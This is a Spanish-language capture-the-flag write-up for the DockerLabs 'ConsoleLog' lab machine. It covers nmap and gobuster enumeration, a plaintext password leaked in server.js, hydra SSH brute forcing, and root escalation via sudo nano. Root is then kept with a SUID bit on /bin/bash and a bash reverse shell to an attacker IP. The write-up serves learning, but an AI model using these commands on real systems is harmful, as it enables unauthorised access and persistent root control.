# Console Log

En esta lectura se documentara el paso a paso para resolver la maquina ConsoleLog de la plataforma DockerLabs

![image.png](Console%20Log/image.png)

**Descargamos y desplegamos :** 

![image.png](Console%20Log/image%201.png)

Con ping comprobamos que la misma esta activa, el TTL de 64 nos indica que es una maquina Linux : 

![image.png](Console%20Log/image%202.png)

## Enumeración

Realizamos un escaneo con Nmap utilizando un Syn Scan, el cual es más rápido y discreto en entornos reales debido a que no completa el saludo de tres vías. Esto nos permite detectar puertos abiertos de manera eficiente sin establecer conexiones completas, reduciendo así la probabilidad de ser detectados.

```bash
nmap -sS -p- --open -Pn -n --min-rate=5000 172.17.0.2
```

Encontramos abiertos los siguientes puertos : 

![image.png](Console%20Log/image%203.png)

Realizamos un nuevo escaneo con Nmap, esta vez enfocado únicamente en los puertos abiertos y utilizando el parámetro `-A`. Este parámetro ejecuta un conjunto de scripts de Nmap que permite identificar las versiones de los servicios y del sistema operativo en ejecución.

```bash
nmap -A -p 80,3000,5000 -Pn -n 172.17.0.2
```

![image.png](Console%20Log/image%204.png)

Notamos que los primeros son dos paginas web http y el ultimo es ssh pero en un puerto no estándar

Consultamos a la herramienta **`whatweb`** para ver con que tecnologías esta diseñada la web.

```bash
whatweb http::172.17.0.2
```

![image.png](Console%20Log/image%205.png)

Vamos a ingresar al puerto 80 haber que encontramos : 

![image.png](Console%20Log/image%206.png)

## Explotación

Al ver el código fuente de este sitio, descubrimos un archivo “js” con un token, lo que podría tratarse de una vulnerabilidad a mitigar o informar si esto fuese un caso real al tratarse de data sensible expuesta.

![image.png](Console%20Log/image%207.png)

Al revisar este archivo vemos la siguiente información que nos podría llegar a ser útil, por lo que la guardaremos.

![image.png](Console%20Log/image%208.png)

Ingresamos al segundo puerto abierto para visualizar su contenido pero de momento no es posible acceder:

![image.png](Console%20Log/image%209.png)

Al hacer fuzzing encontramos el directorio backend con archivos útiles. Para esto use la herramienta `gobuster`.

**Gobuster** es una herramienta de fuerza bruta utilizada para descubrir directorios, archivos, subdominios, y hosts virtuales ocultos en un servidor web. Funciona utilizando una lista de palabras (wordlist) para realizar solicitudes repetidas al servidor, lo que permite identificar recursos no visibles o no indexados.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

![image.png](Console%20Log/image%2010.png)

De estos directorios encontrados con ese diccionario vamos a revisar `/backend` que parece el mas interesante.

![image.png](Console%20Log/image%2011.png)

Encontramos este server.js que me da mucha curiosidad…

![image.png](Console%20Log/image%2012.png)

esa contraseña en texto plano ahí ubicada es muy rara, tenemos un puerto con ssh abierto por lo que vamos a intentar averiguar con hydra si algún usuario la esta utilizando :

```bash
hydra -L /usr/share/wordlists/rockyou.txt -p password ssh://172.17.0.2:5000 -t 64
```

![image.png](Console%20Log/image%2013.png)

Encontramos al usuario lovely con la contraseña conseguida porque estaba expuesta en texto plano, por lo que nos conectamos mediante ssh al puerto indicado en el escaneo.

```bash
ssh lovely@172.17.0.2 -p 5000
```

![image.png](Console%20Log/image%2014.png)

## Post - explotación / Escalada de privilegios

Realizamos la escalada privilegios, vamos a enumerar los permisos de sudo que tiene el usuario actual, esto lo hacemos con `sudo -l`
El comando `sudo -l` se utiliza para listar los privilegios de `sudo` que tiene el usuario actual.

![image.png](Console%20Log/image%2015.png)

Descubrimos que tiene permisos de sudo para nano por lo que vamos a buscar el en sitio “[https://gtfobins.github.io/](https://gtfobins.github.io/)” si hay una manera de escalar a root con nano.

![image.png](Console%20Log/image%2016.png)

Encontramos esta manera que al ejecutarla nos permite ejecutar comandos como root pero de una manera un poco incomoda…

![image.png](Console%20Log/image%2017.png)

Una vez obtenida de esta manera una consola inestable de root tenemos dos opciones: 

La primera cambiarle los permiso a la bash con **`chmod u+s /bin/bash`**para que
 establecer el bit SUID (Set User ID) en el archivo `/bin/bash`. Esto sirve para que ue cuando cualquier usuario ejecuta el archivo `/bin/bash`, el proceso que se crea tiene los privilegios del propietario del archivo, que en este caso es típicamente el usuario root. Así, cualquier usuario que ejecute `/bin/bash` obtendría una shell con privilegios de root.

![image.png](Console%20Log/image%2018.png)

Probamos ejecutar una bash de root con el usuario lovely y vemos que es posible.
![image.png](Console%20Log/image%2019.png)

La segunda es mandar una **shell** reversa a un puerto de nuestra maquina atacante y ponernos en escucha con netcat a dicho puerto.

```bash
bash -c 'bash -i >& /dev/tcp/192.168.0.203/444 0>&1'
```

![image.png](Console%20Log/image%2020.png)

Desde nuestra maquina atacante usamos

```bash
nc -nlvp 444
```

**Esta es otra alternativa  pero se considera mas estable la primera.**

![image.png](Console%20Log/image%2021.png)

**PWNED**!!!

<aside>
💡 Muchas gracias por leer, este es mi primer WriteUp para la plataforma DockerLabs, estaré subiendo mas en estos días, mientras busco seguir aprendiendo.

</aside>

**Saludos!!!**
